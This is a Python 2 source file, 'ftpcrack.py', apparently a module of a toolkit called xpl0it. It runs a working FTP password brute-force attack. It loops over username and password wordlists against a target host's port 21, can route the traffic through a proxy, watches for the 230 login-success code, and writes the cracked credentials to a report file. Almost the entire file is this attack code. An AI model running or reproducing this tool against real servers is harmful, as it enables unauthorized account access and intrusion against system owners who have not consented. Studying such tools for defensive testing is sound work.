#!/usr/bin/python
#ftpcrack.py

#ftpcrack module for xpl0it v0.3
#Coded by wrh1d3 -> wrh1d3[at]gmail[dot]com
#Copyright (c) 2016-2017 J3kill Soft. by wrh1d3

import os, time

from auxilliary.proxy import *
from auxilliary.utils import *

class ftpcrack: 
	
	def __init__(self, args):
		self.target = args[1]
		self.port = 21
		self.username = args[2]
		self.proxy = args[3]
		self.proxy_type = args[4]
		self.verbose = args[5]
		self.userslist = os.getcwd() + "/wordslist/users.txt"
		self.wordslist = os.getcwd() + "/wordslist/pass.txt"
		self.results = ""
		
	def crack(self):
		print "\n[+] Target: " + self.target
		if self.username != "":
			print "[+] Username: " + self.username
			
		if self.verbose == 1:
			print "[!] Checking proxy..."
			
		if self.proxy != "":
			hst, prt = parse_address(self.proxy)
			pr = proxy(hst, prt, self.proxy_type)
			if pr.set_socket_proxy() == True:  
				print "[+] Proxy: " + self.proxy
			else:
				print "[-] Invalid or dead proxy"
		else:
			print "[-] Proxy not set"
			pr = proxy("", "", "")
			pr.set_no_proxy()
		
		print 
		
		if self.username == "":
			try:
				if pr.connect(self.target, self.port) == True:
				
					if self.verbose == 1:
						print "[!] Checking wordslists..."
				
					usernames = open(self.userslist, "r").readlines()
					passwords = open(self.wordslist, "r").readlines()
						
					for user in usernames:
						username = user.replace("\n", "")
						print "[*] Trying username: " + username
						
						for word in passwords:
							password = word.replace("\n", "")
							print "[*] Trying password: " + password			
							pr.send("USER " + username + "\r\n")
							pr.recv(1024)
							pr.send("PASS " + password + "\r\n")
							r = pr.recv(1024)
							if "230" in r:
								self.results = "Login is %s:%s" %(username, password)
								print "[+] " + self.results
								break
			except:
				self.results = "Failed to crack password"
				print "[-] " + self.results
		else:
			try:
				if pr.connect(self.target, self.port) == True:
					
					if self.verbose == 1:
						print "[!] Checking wordslists..."
				
					passwords = open(self.wordslist, "r").readlines()
						
					for word in passwords:
						password = word.replace("\n", "")
						print "[*] Trying: " + password			
						pr.send("USER " + self.username + "\r\n")
						pr.recv(1024)
						pr.send("PASS " + password + "\r\n")
						r = pr.recv(1024)
						if "230" in r:
							self.results = "Password is " + password
							print "[+] " + self.results
							break
			except:
				self.results = "Failed to crack password"
				print "[-] " + self.results
					
	def generate_report(self):
		date = time.strftime("%d-%m-%Y")
		filename = "ftpcrack_report_%s.txt" %(date)
		
		if not os.path.exists(os.getcwd() + "/reports/" + filename): 
			f = open(os.getcwd() + "/reports/" + filename, "w")
			f.writelines("[!] xpl0it penetration testing toolkit -> ftpcrack report\n\n")
			
		f = open(os.getcwd() + "/reports/" + filename, "a")
		f.writelines("Target: " + self.target + "\n")
		if self.username != "":
			f.writelines("Username: " + self.username + "\n")
		f.writelines("Results: \n\n" + self.results + "\n\n")
